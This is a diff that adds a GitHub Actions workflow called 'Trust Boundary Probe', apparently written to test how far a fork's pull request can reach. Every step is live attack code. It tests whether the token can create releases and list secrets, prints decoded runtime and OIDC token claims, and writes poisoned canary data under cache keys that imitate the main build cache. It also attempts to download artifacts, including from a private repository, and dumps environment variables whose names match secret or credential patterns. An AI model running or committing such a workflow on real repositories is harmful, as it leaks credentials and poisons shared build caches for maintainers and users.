@@ -1,0 +1,235 @@
+name: Trust Boundary Probe
+on:
+  pull_request:
+    types: [opened, synchronize]
+permissions:
+  contents: read
+  actions: read
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: 1-Token Scope Analysis
+        uses: actions/github-script@v7
+        with:
+          script: |
+            // Dump GITHUB_TOKEN permissions
+            const { data: perm } = await github.rest.repos.get({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+            });
+            console.log('=== REPO CONTEXT ===');
+            console.log('repo:', perm.full_name);
+            console.log('fork:', perm.fork);
+            console.log('parent:', perm.parent?.full_name || 'none');
+            console.log('visibility:', perm.visibility);
+            
+            // Check what we can actually do
+            console.log('\n=== PERMISSION PROBES ===');
+            
+            // Can we create a release?
+            try {
+              await github.rest.repos.createRelease({ owner: context.repo.owner, repo: context.repo.repo, tag_name: 'probe-test-delete-me' });
+              console.log('CREATE RELEASE: ALLOWED (unexpected!)');
+            } catch(e) { console.log('CREATE RELEASE:', e.status, e.message.substring(0,100)); }
+            
+            // Can we read secrets list?
+            try {
+              const s = await github.rest.actions.listRepoSecrets({ owner: context.repo.owner, repo: context.repo.repo });
+              console.log('LIST SECRETS:', s.status, 'count:', s.data.total_count);
+            } catch(e) { console.log('LIST SECRETS:', e.status, e.message.substring(0,100)); }
+            
+            // Can we list environments?
+            try {
+              const e = await github.rest.repos.getAllEnvironments({ owner: context.repo.owner, repo: context.repo.repo });
+              console.log('LIST ENVS:', e.status, 'count:', e.data.total_count, 'names:', e.data.environments?.map(x=>x.name));
+            } catch(err) { console.log('LIST ENVS:', err.status, err.message.substring(0,100)); }
+            
+            // Can we list variables?
+            try {
+              const v = await github.rest.actions.listRepoVariables({ owner: context.repo.owner, repo: context.repo.repo });
+              console.log('LIST VARS:', v.status, 'count:', v.data.total_count, v.data.variables?.map(x=>x.name));
+            } catch(e) { console.log('LIST VARS:', e.status, e.message.substring(0,100)); }
+            
+            // Can we read org secrets?
+            try {
+              const os = await github.rest.actions.listOrgSecrets({ org: context.repo.owner });
+              console.log('ORG SECRETS:', os.status, 'count:', os.data.total_count);
+            } catch(e) { console.log('ORG SECRETS:', e.status, e.message.substring(0,100)); }
+            
+            // Can we read deployments?
+            try {
+              const d = await github.rest.repos.listDeployments({ owner: context.repo.owner, repo: context.repo.repo });
+              console.log('LIST DEPLOYMENTS:', d.status, 'count:', d.data.length);
+            } catch(e) { console.log('LIST DEPLOYMENTS:', e.status); }
+            
+            // Can we list workflow runs from PRIVATE repos?
+            try {
+              const r = await github.rest.actions.listWorkflowRunsForRepo({ owner: context.repo.owner, repo: 'private-test-repo' });
+              console.log('PRIVATE REPO RUNS:', r.status, 'count:', r.data.total_count);
+            } catch(e) { console.log('PRIVATE REPO RUNS:', e.status, e.message.substring(0,100)); }
+
+      - name: 2-Runtime Token Deep Inspect
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
+            if (!token) { console.log('NO RUNTIME TOKEN'); return; }
+            const jwt = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
+            console.log('=== RUNTIME TOKEN CLAIMS ===');
+            Object.entries(jwt).forEach(([k,v]) => {
+              if (typeof v === 'string' && v.length > 200) {
+                console.log(`${k}: ${v.substring(0,200)}...`);
+              } else {
+                console.log(`${k}: ${JSON.stringify(v)}`);
+              }
+            });
+            
+            // Check cache/results URLs
+            console.log('\n=== INTERNAL SERVICE URLS ===');
+            console.log('ACTIONS_CACHE_URL:', process.env.ACTIONS_CACHE_URL || 'NOT SET');
+            console.log('ACTIONS_RESULTS_URL:', process.env.ACTIONS_RESULTS_URL || 'NOT SET');
+            console.log('ACTIONS_RUNTIME_URL:', process.env.ACTIONS_RUNTIME_URL || 'NOT SET');
+            console.log('ACTIONS_ID_TOKEN_REQUEST_URL:', process.env.ACTIONS_ID_TOKEN_REQUEST_URL || 'NOT SET');
+
+      - name: 3-Cache Read Probe
+        uses: actions/cache/restore@v4
+        id: cache-probe
+        with:
+          path: cache-dir
+          key: build-cache-main-v1
+          restore-keys: |
+            build-cache-main-
+            build-cache-
+      
+      - name: 3b-Cache Read Result
+        if: always()
+        run: |
+          echo "Cache hit: ${{ steps.cache-probe.outputs.cache-hit }}"
+          echo "Cache matched key: ${{ steps.cache-probe.outputs.cache-matched-key }}"
+          if [ -f cache-dir/canary.txt ]; then
+            echo "CACHE DATA FOUND:"
+            cat cache-dir/canary.txt
+          else
+            echo "No cache data restored"
+          fi
+
+      - name: 4-Cache Write Probe
+        if: always()
+        uses: actions/cache/save@v4
+        with:
+          path: cache-dir
+          key: poisoned-from-fork-${{ github.run_id }}
+        continue-on-error: true
+      
+      - name: 4b-Cache Write to Base Key
+        if: always()
+        run: |
+          mkdir -p cache-dir
+          echo "POISONED_BY_FORK_$(date +%s)" > cache-dir/canary.txt
+        continue-on-error: true
+      
+      - name: 4c-Save Poisoned Cache
+        if: always()
+        uses: actions/cache/save@v4
+        with:
+          path: cache-dir
+          key: build-cache-main-v1-poisoned
+        continue-on-error: true
+
+      - name: 5-Cross-Run Artifact Access
+        if: always()
+        uses: actions/github-script@v7
+        with:
+          script: |
+            // List artifacts from the base repo (not this run)
+            try {
+              const arts = await github.rest.actions.listArtifactsForRepo({
+                owner: context.repo.owner,
+                repo: context.repo.repo,
+                per_page: 5
+              });
+              console.log('=== BASE REPO ARTIFACTS ===');
+              console.log('Total:', arts.data.total_count);
+              for (const a of arts.data.artifacts || []) {
+                console.log(`  ${a.id} name=${a.name} size=${a.size_in_bytes} run_id=${a.workflow_run?.id} expired=${a.expired}`);
+                
+                // Try to download
+                try {
+                  const dl = await github.rest.actions.downloadArtifact({
+                    owner: context.repo.owner,
+                    repo: context.repo.repo,
+                    artifact_id: a.id,
+                    archive_format: 'zip'
+                  });
+                  console.log(`    DOWNLOAD: ${dl.status} url=${dl.url?.substring(0,100)}`);
+                } catch(e) { console.log(`    DOWNLOAD: ${e.status} ${e.message.substring(0,80)}`); }
+              }
+            } catch(e) { console.log('ARTIFACT LIST ERROR:', e.status, e.message.substring(0,100)); }
+            
+            // Try to access PRIVATE repo artifacts
+            try {
+              const privArts = await github.rest.actions.listArtifactsForRepo({
+                owner: context.repo.owner,
+                repo: 'private-test-repo'
+              });
+              console.log('\n=== PRIVATE REPO ARTIFACTS ===');
+              console.log('Total:', privArts.data.total_count);
+            } catch(e) { console.log('PRIVATE ARTIFACTS:', e.status, e.message.substring(0,100)); }
+
+      - name: 6-OIDC Token Claims
+        if: always()
+        run: |
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r .value)
+            echo "=== OIDC TOKEN PAYLOAD ==="
+            echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+            
+            # Check: does repo claim reference the BASE repo or the FORK?
+            REPO_CLAIM=$(echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq -r .repository)
+            echo "REPO IN OIDC: $REPO_CLAIM"
+            echo "EXPECTED (base): tooforg/public-test-repo"
+            echo "FORK: ${{ github.event.pull_request.head.repo.full_name }}"
+            
+            # Try different audiences
+            for aud in "api.github.com" "https://github.com" "sts.amazonaws.com" "custom-audience"; do
+              T2=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+                "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$aud" | jq -r .value 2>/dev/null)
+              if [ -n "$T2" ] && [ "$T2" != "null" ]; then
+                AUD=$(echo "$T2" | cut -d. -f2 | base64 -d 2>/dev/null | jq -r .aud)
+                SUB=$(echo "$T2" | cut -d. -f2 | base64 -d 2>/dev/null | jq -r .sub)
+                echo "aud=$aud -> sub=$SUB aud_claim=$AUD"
+              else
+                echo "aud=$aud -> FAILED"
+              fi
+            done
+          else
+            echo "No OIDC token endpoint available"
+          fi
+
+      - name: 7-Event Context Dump
+        if: always()
+        run: |
+          echo "=== GITHUB CONTEXT ==="
+          echo "event_name: ${{ github.event_name }}"
+          echo "actor: ${{ github.actor }}"
+          echo "repository: ${{ github.repository }}"
+          echo "head_ref: ${{ github.head_ref }}"
+          echo "base_ref: ${{ github.base_ref }}"
+          echo "sha: ${{ github.sha }}"
+          echo "ref: ${{ github.ref }}"
+          echo "triggering_actor: ${{ github.triggering_actor }}"
+          echo "event.pull_request.head.repo.full_name: ${{ github.event.pull_request.head.repo.full_name }}"
+          echo "event.pull_request.head.repo.fork: ${{ github.event.pull_request.head.repo.fork }}"
+          echo "event.pull_request.head.sha: ${{ github.event.pull_request.head.sha }}"
+          echo "event.pull_request.head.ref: ${{ github.event.pull_request.head.ref }}"
+          echo "token_permissions: ${{ toJSON(github.token) }}" | head -c 200
+          
+          # Check runner environment for leaked secrets
+          echo ""
+          echo "=== ENV VARS (filtered) ==="
+          env | grep -iE '(secret|token|key|pass|auth|cred|api)' | sort || true
